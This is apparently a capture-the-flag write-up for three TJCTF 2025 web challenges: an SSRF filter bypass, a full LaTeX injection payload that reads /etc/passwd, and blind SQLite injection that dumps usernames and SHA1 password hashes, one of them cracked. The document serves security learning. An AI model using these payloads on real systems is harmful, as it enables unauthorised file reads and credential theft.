------------------

### CTF-: TJCTF 2025

------------------

- Web-:
  - Loopy
  - Texploit
  - Chilly-site

------------------

### Loopy

------------------

![image](https://github.com/user-attachments/assets/faccb1a6-72ec-437d-bbd7-8135c2400c9f)

------------------

- The website allows users to preview site which fits a Server Side Request Forgery scenario.

![image](https://github.com/user-attachments/assets/94cfbb3c-81d6-4518-a156-996930936ce9)

- The challenge description gave a hint to load a service at port `5000`.I tried to load it with `localhost:5000` and it  didn't work.Oops, it looks like the site has a long list of filters for the service.

![image](https://github.com/user-attachments/assets/be0b14a8-cfa0-4cc5-8ff4-9c6ee91393ae)

- You can try simple ssrf bypass tricks by using a redirect or just look another represntation of localhost which worked for me. Bypass-: ```http://0:5000/admin```.

![image](https://github.com/user-attachments/assets/82997e35-23b5-4a92-8f30-8f63bb633633)

- Flag-:```tjctf{i_l0v3_ssssSsrF_9o4a8}```

--------------------

### Texploit

--------------------

![image](https://github.com/user-attachments/assets/1774ea97-8ba2-4693-925a-f6d5e5022131)

---------------------

- The site is a latex compiler that compiles latex code into pdf.I tried the basic latex payload like `/input` and it didn't work.

![image](https://github.com/user-attachments/assets/7569e4ab-17d3-417f-a4f8-120f4b69350f)

-  After google searching for sometime,I got this payload from a [ctf writeup](https://hackmd.io/@toxicpie9/By154DFe9) that allows us to read files by triggering an error. The main idea is that `pdflatex` prints errors to stdout in a special format, so we can do something like \typeout{! abc} to trick the bot into thinking that abc is an error.Payload-:

```pdflatex
\catcode0=10  % make \0 not produce a syntax error
\catcode9=11  % make \t indents work correctly

\def\n{/etc/passwd}
\def\l{0}
\def\r{420}

\newread\file
\openin\file=\n

\newcounter{line}
\makeatletter
\@whilenum\value{line} < \r \do {
    \read\file to \fileline
    \stepcounter{line}
    \ifnum\value{line} > \l
        \typeout{! \fileline}
    \fi
}
```

- The payload above will read 420 chars in the `/etc/passwd` file.

![image](https://github.com/user-attachments/assets/ba14032a-7c87-400c-a9b0-6e4a7f1c361d)

- Flag-: ```tjctf{f1l3_i0_1n_l4t3x?} ```

![image](https://github.com/user-attachments/assets/4800df94-9e44-41f6-8c2b-7ad982f4338d)


--------------------

### Chill-site

--------------------

![image](https://github.com/user-attachments/assets/bb01070a-dd95-48b6-929d-e8b828ca056d)

---------------------

- The site is vulnerable to sqlite3 injection and it filters important chars like `or` and `--`.My teammates discovered a user `test` which made it easier to use `AND` and also replaced `--` with `/*`.
- After enumerating for a long time,I discovered columns for `stats` and `database`.I focused more on dumping `database` with my script.To avoid wasting time, we'll focus solely on column `user` and `pass`.The crucial user in this chall is `tuxtheflagmasteronlylikeslowercaseletters`.User's dump-:

```bash
[+] Number of tables-:2
[+] Number of Data's strings-:4
[+]Dumping String:table:database:column:user
[+]Finding String Length
[+] String-Length:-:3
[+] Found Char:-:Y
[+] Found Char:-:o
[+] Found Char:-:u
[+] Column user dumped::You
[+]Finding String Length
[+] String-Length:-:4
[+] Found Char:-:t
[+] Found Char:-:e
[+] Found Char:-:s
[+] Found Char:-:t
[+] Column user dumped::test
[+]Finding String Length
[+] String-Length:-:41
[+] Found Char:-:t
[+] Found Char:-:u
[+] Found Char:-:x
[+] Found Char:-:t
[+] Found Char:-:h
[+] Found Char:-:e
[+] Found Char:-:f
[+] Found Char:-:l
[+] Found Char:-:a
[+] Found Char:-:g
[+] Found Char:-:m
[+] Found Char:-:a
[+] Found Char:-:s
[+] Found Char:-:t
[+] Found Char:-:e
[+] Found Char:-:r
[+] Found Char:-:o
[+] Found Char:-:n
[+] Found Char:-:l
[+] Found Char:-:y
[+] Found Char:-:l
[+] Found Char:-:i
[+] Found Char:-:k
[+] Found Char:-:e
[+] Found Char:-:s
[+] Found Char:-:l
[+] Found Char:-:o
[+] Found Char:-:w
[+] Found Char:-:e
[+] Found Char:-:r
[+] Found Char:-:c
[+] Found Char:-:a
[+] Found Char:-:s
[+] Found Char:-:e
[+] Found Char:-:l
[+] Found Char:-:e
[+] Found Char:-:t
[+] Found Char:-:t
[+] Found Char:-:e
[+] Found Char:-:r
[+] Found Char:-:s
[+] Column user dumped::tuxtheflagmasteronlylikeslowercaseletters
[+]Finding String Length
[+] String-Length:-:6
[+] Found Char:-:h
[+] Found Char:-:u
[+] Found Char:-:m
[+] Found Char:-:a
[+] Found Char:-:n
[+] Found Char:-:A
[+] Column user dumped::humanA
```
- Users-:

![image](https://github.com/user-attachments/assets/b345ea41-a008-49ab-bab2-8e9a9ac632f4)

- Password-hash-:

```bash
[+] Number of tables-:2
[+] Number of Data's strings-:4
[+]Dumping String:table:database:column:pass
[+]Finding String Length
[+] String-Length:-:40
[+] Found Char:-:6
[+] Found Char:-:b
[+] Found Char:-:5
[+] Found Char:-:f
[+] Found Char:-:8
[+] Found Char:-:e
[+] Found Char:-:7
[+] Found Char:-:4
[+] Found Char:-:5
[+] Found Char:-:3
[+] Found Char:-:7
[+] Found Char:-:8
[+] Found Char:-:e
[+] Found Char:-:0
[+] Found Char:-:f
[+] Found Char:-:c
[+] Found Char:-:6
[+] Found Char:-:4
[+] Found Char:-:c
[+] Found Char:-:e
[+] Found Char:-:2
[+] Found Char:-:0
[+] Found Char:-:d
[+] Found Char:-:c
[+] Found Char:-:0
[+] Found Char:-:4
[+] Found Char:-:1
[+] Found Char:-:9
[+] Found Char:-:7
[+] Found Char:-:4
[+] Found Char:-:b
[+] Found Char:-:0
[+] Found Char:-:5
[+] Found Char:-:b
[+] Found Char:-:f
[+] Found Char:-:5
[+] Found Char:-:c
[+] Found Char:-:1
[+] Found Char:-:c
[+] Found Char:-:c
[+] Column pass dumped::6b5f8e745378e0fc64ce20dc041974b05bf5c1cc
[+]Finding String Length
[+] String-Length:-:40
[+] Found Char:-:9
[+] Found Char:-:a
[+] Found Char:-:2
[+] Found Char:-:3
[+] Found Char:-:b
[+] Found Char:-:6
[+] Found Char:-:d
[+] Found Char:-:4
[+] Found Char:-:9
[+] Found Char:-:a
[+] Found Char:-:a
[+] Found Char:-:2
[+] Found Char:-:4
[+] Found Char:-:4
[+] Found Char:-:b
[+] Found Char:-:7
[+] Found Char:-:b
[+] Found Char:-:0
[+] Found Char:-:d
[+] Found Char:-:b
[+] Found Char:-:5
[+] Found Char:-:2
[+] Found Char:-:9
[+] Found Char:-:4
[+] Found Char:-:9
[+] Found Char:-:c
[+] Found Char:-:0
[+] Found Char:-:9
[+] Found Char:-:3
[+] Found Char:-:2
[+] Found Char:-:c
[+] Found Char:-:3
[+] Found Char:-:6
[+] Found Char:-:5
[+] Found Char:-:e
[+] Found Char:-:c
[+] Found Char:-:8
[+] Found Char:-:1
[+] Found Char:-:9
[+] Found Char:-:1
[+] Column pass dumped::9a23b6d49aa244b7b0db52949c0932c365ec8191
[+]Finding String Length
[+] String-Length:-:40
[+] Found Char:-:6
[+] Found Char:-:4
[+] Found Char:-:b
[+] Found Char:-:7
[+] Found Char:-:c
[+] Found Char:-:9
[+] Found Char:-:0
[+] Found Char:-:a
[+] Found Char:-:9
[+] Found Char:-:9
[+] Found Char:-:1
[+] Found Char:-:5
[+] Found Char:-:7
[+] Found Char:-:1
[+] Found Char:-:c
[+] Found Char:-:1
[+] Found Char:-:0
[+] Found Char:-:7
[+] Found Char:-:c
[+] Found Char:-:c
[+] Found Char:-:6
[+] Found Char:-:6
[+] Found Char:-:3
[+] Found Char:-:a
[+] Found Char:-:a
[+] Found Char:-:7
[+] Found Char:-:6
[+] Found Char:-:8
[+] Found Char:-:5
[+] Found Char:-:1
[+] Found Char:-:4
[+] Found Char:-:8
[+] Found Char:-:2
[+] Found Char:-:2
[+] Found Char:-:8
[+] Found Char:-:9
[+] Found Char:-:6
[+] Found Char:-:f
[+] Found Char:-:4
[+] Found Char:-:9
[+] Column pass dumped::64b7c90a991571c107cc663aa768514822896f49
[+]Finding String Length
[+] String-Length:-:40
[+] Found Char:-:9
[+] Found Char:-:a
[+] Found Char:-:a
[+] Found Char:-:8
[+] Found Char:-:8
[+] Found Char:-:8
[+] Found Char:-:e
[+] Found Char:-:9
[+] Found Char:-:a
[+] Found Char:-:d
[+] Found Char:-:7
[+] Found Char:-:f
[+] Found Char:-:2
[+] Found Char:-:1
[+] Found Char:-:9
[+] Found Char:-:a
[+] Found Char:-:1
[+] Found Char:-:3
[+] Found Char:-:3
[+] Found Char:-:4
[+] Found Char:-:8
[+] Found Char:-:3
[+] Found Char:-:6
[+] Found Char:-:2
[+] Found Char:-:b
[+] Found Char:-:4
[+] Found Char:-:d
[+] Found Char:-:f
[+] Found Char:-:4
[+] Found Char:-:e
[+] Found Char:-:4
[+] Found Char:-:1
[+] Found Char:-:d
[+] Found Char:-:a
[+] Found Char:-:3
[+] Found Char:-:3
[+] Found Char:-:c
[+] Found Char:-:b
[+] Found Char:-:4
[+] Found Char:-:8
[+] Column pass dumped::9aa888e9ad7f219a13348362b4df4e41da33cb48
```

- Hash-: ```64b7c90a991571c107cc663aa768514822896f49```-:

![image](https://github.com/user-attachments/assets/47ee29c2-0a14-4bcb-84f9-327099cc88a2)


- My team mate cracked the hash which is sha1 for `allsgud` and accessed the account for user `tuxtheflagmasteronlylikeslowercaseletters` to get the flag.

![image](https://github.com/user-attachments/assets/5d5cd88f-c7ff-4c1a-9865-97d8ab89d262)

- Flag-:```tjctf{3verth1ng_i5_fin3}```

---------------------

###  Reference

--------------------

- [Latex Injection](https://hackmd.io/@toxicpie9/By154DFe9)

--------------------
